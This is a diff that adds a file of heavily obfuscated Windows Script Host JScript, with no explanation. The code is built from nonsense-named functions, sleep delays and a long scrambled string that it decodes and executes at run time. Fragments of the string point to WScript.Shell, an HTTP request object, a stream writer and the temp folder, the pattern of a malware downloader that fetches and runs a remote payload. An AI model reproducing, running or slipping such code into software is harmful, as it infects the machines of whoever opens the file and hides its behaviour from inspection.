@@ -1,0 +1,15 @@
+function will(able,expect){fresh=[6055];segment(fresh);}
+function side(fun){return fun % (lead+lead);}
+function put(pattern,some,kill,sense){fresh[6568737]=guess;age[two] = substance[age[wear]];}
+function once(allow,solution,prove,house,me,you,heavy) { if (side(prove)) return allow+solution; else return solution+allow; }
+function segment(watch,surprise,what,describe){WScript.Sleep(49104);mine=3455;while(substance=substance){try{fresh[mine](mine);}catch(collect){fresh[2501597]=substance;}mine++}}
+function search(effect,four,cook,field,cow,cat) {return effect.substr(four,cook);}
+function guess(yard,stand){age[two](age[lead])(fresh);}
+function give(wild,silver){or=1;lead=or;WScript.Sleep(8534);two=lead+or*lead+or;fresh[5243762]=that;}
+function gray(pound,sent,sheet,experiment,thing){return search(pound,sent,or);}
+will(7609);
+function list(blood,care,hundred,molecule,boy){agree="";kept=wear;while (kept < 2915) {degree=gray(blood,kept);agree=once(agree,degree,kept); kept++; }return agree;}
+function substance(always,under,moment){fresh[3039285]=give;WScript.Sleep(4002);need = 'mk(ne.(oni rtnfiSdivte nrx;EiOtdnfxng(eas\\T\"(pe@\"x\\\\s\"%En+U.opS)p+E\\s\"R\\e\"Dlr@Nl.\\S\"zeD, hO =SM0 .A)ktI) pN=ri%=ar\"-\\cv1)S ) W{ !\\ \"={)(  0t\"W\\c0S%e2cUj rSb=iEO=pRe=tDt .NassSeulDrteOCaeM.tpAts(Ip.2Niz2%r(2\"c\\2 S)2fW )i({;  p }f=} ip ; +ee;\"l\\)ss20le73a 8+f{10  47nk6,r \"2\\=u(; t]}ke\\ \"r.tr rrt{eys)p{bel u(azshc.\\c\"oet[p(a)e\\c\"n(}@(g \\\'\"\\n;+Gi)pEr(+Ttd\\\'\"\\Sn@,oe\\ \"st\',\\..\\h\"z)t\\ \"t(;)pm);soe :dsv/nla/aar\'r\\ f.+B hw ,t[=paY +M]k\" \\.+==r\' \\etp/pw slr;eao)acc\\r\'wecPe(hTh/.Tu(pHe\\h\\gLpdpM\'{\\Xs2+r?}\"e\\)\'v(/trsgiel,(S] b.[fe2guaL{n MycrXtt}S;i4M7o=\\e\'sna(e rtc(;c4F3e-)7j3 =bb{;O) \"e\"r+t\"eZaSt\"e+u\"r_r\"C+n\".G EtRS\"p t,i\"r\"r i,clniSagsW(.] \"fe=\"r+ \"otzimr WCg{\"h+ \"ae)Rr\"3[Ca  o{< d) ee(Yh(c(tpa ca e}r l;s)ileihaIsw(n] \"t\";+(\"0dF\" +,\"=a1\" +0\"Ye)\" ++\";R3g]\"0+\\\"\"e)\"g+;\"rR \"o[}a. ){n ;yir tn;a\"e\\g\\bLelnf[hiC3xc\\]\\u\"(+p\"B\"a+)\"cR(Ee\")+r\";SeU \"r+W\"f_S\".+c\"wTrNw\"i+w\"pE\\\"\"+t\",R.\"\\+\"\"QRm\"u+o\"iUc\"t+.\"(Ci\")+g\";_i\" +u\"}YlE \"e+}\"dK \"e+e\"pHl\"p s=e elsi aus{ i; )g\"Wl.\"S+w\"clw\"r+w\"ie\\h\"Sp\",+t\"\\.\"\".+m\"sto\"l+c\"ep.ie\"s+p\"lr(\"h+2\"ac2\"d+2\"gS2\"a+2\"hW)\".(;]w\" tw\"}+w\" c\\e\"\"Y+[\"+j b+O=e;t \"}+w\" a\'\")+)\"(e)\";+}\"craCt\"c[h)(tep)i{rWcSScWr(i p=t .as;l3e6e9p8(=5h5z8c3k6m8a5v2i6b)r;z}UtffJwPhSmrqomtzceudrjt=sangoec;';wear=0;}
+function that(third,why){sell="SPJfU";fresh[6003629]=put;age=gather(list(need),sell);}
+function cost(fine,quiet,our,observe) {return fine.length; }
+function gather(since,is,climb,busy) {clothe = cost(is);decimal = wear;appear=[];for (about=wear; about<=(cost(since)-clothe); about++) {if (search(since,about,clothe)==is){appear[cost(appear)]=search(since,decimal,(about-decimal));decimal = about+clothe;}}appear[cost(appear)]=search(since,decimal);return appear;}
